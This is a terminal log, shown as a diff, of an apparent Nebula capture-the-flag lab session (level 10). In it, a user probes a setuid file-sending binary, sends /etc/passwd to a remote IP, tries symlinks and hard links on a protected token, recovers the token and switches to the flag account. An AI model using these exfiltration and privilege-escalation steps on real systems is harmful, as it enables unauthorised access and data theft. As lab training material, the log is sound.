@@ -1,0 +1,65 @@
+total output:
+
+
+level10@nebula:~$ cd /home/flag10/
+level10@nebula:/home/flag10$ ls
+flag10  token
+level10@nebula:/home/flag10$ ls -la
+total 14
+drwxr-x--- 2 flag10 level10   93 2011-11-20 21:22 .
+drwxr-xr-x 1 root   root     360 2012-08-27 07:18 ..
+-rw-r--r-- 1 flag10 flag10   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag10 flag10  3353 2011-05-18 02:54 .bashrc
+-rwsr-x--- 1 flag10 level10 7743 2011-11-20 21:22 flag10
+-rw-r--r-- 1 flag10 flag10   675 2011-05-18 02:54 .profile
+-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token
+level10@nebula:/home/flag10$ ./flag10
+./flag10 file host
+        sends file to host if you have access to it
+level10@nebula:/home/flag10$ ./flag10 token 192.168.122.1
+You don't have access to token
+level10@nebula:/home/flag10$ ln -s /home/flag10/token ~/wow
+level10@nebula:/home/flag10$ ./flag10 ~/wow 192.168.122.1
+You don't have access to /home/level10/wow
+level10@nebula:/home/flag10$ ls -l
+total 9
+-rwsr-x--- 1 flag10 level10 7743 2011-11-20 21:22 flag10
+-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token
+level10@nebula:/home/flag10$ ./flag10 token 192.168.122.1
+You don't have access to token
+level10@nebula:/home/flag10$ ./flag10 /home/flag10/token 192.168.122.1
+You don't have access to /home/flag10/token
+level10@nebula:/home/flag10$ ./flag10 /etc/passwd 192.168.122.1
+Connecting to 192.168.122.1:18211 .. Connected!
+Sending file .. wrote file!
+level10@nebula:/home/flag10$
+level10@nebula:/home/flag10$ ln /home/flag10/token ~/wow
+ln: creating hard link `/home/level10/wow': File exists
+level10@nebula:/home/flag10$ rm ~/wow
+level10@nebula:/home/flag10$ ln /home/flag10/token ~/wow
+level10@nebula:/home/flag10$ ./flag10 ~/wow 192.168.122.1
+You don't have access to /home/level10/wow
+level10@nebula:/home/flag10$ ls -l ~
+total 5
+-rw------- 2 flag10  flag10   37 2011-11-20 21:22 wow
+-rw-rw-r-- 1 level10 level10 382 2012-08-19 18:27 x
+level10@nebula:/home/flag10$ vim ~/x
+level10@nebula:/home/flag10$ file ~/x
+/home/level10/x: ASCII text
+level10@nebula:/home/flag10$ hexdump -C ~/x
+00000000  0a 0a 0a 0a 0a 0a 0a 0a  0a 0a 0a 0a 0a 0a 0a 0a  |................|
+*
+00000090  0a 0a 0a 0a 0a 0a 0a 0a  0a 0a 0a 0a 0a 36 31 35  |.............615|
+000000a0  61 32 63 65 31 2d 62 32  62 35 2d 34 63 37 36 2d  |a2ce1-b2b5-4c76-|
+000000b0  38 65 65 64 2d 38 61 61  35 63 34 30 31 35 63 32  |8eed-8aa5c4015c2|
+000000c0  37 0a 0a 0a 0a 0a 0a 0a  0a 0a 0a 0a 0a 0a 0a 0a  |7...............|
+000000d0  0a 0a 0a 0a 0a 0a 0a 0a  0a 0a 0a 0a 0a 0a 0a 0a  |................|
+*
+0000017e
+level10@nebula:/home/flag10$ su flag10
+Password: 
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+sh-4.2$ exit
+
+?????????
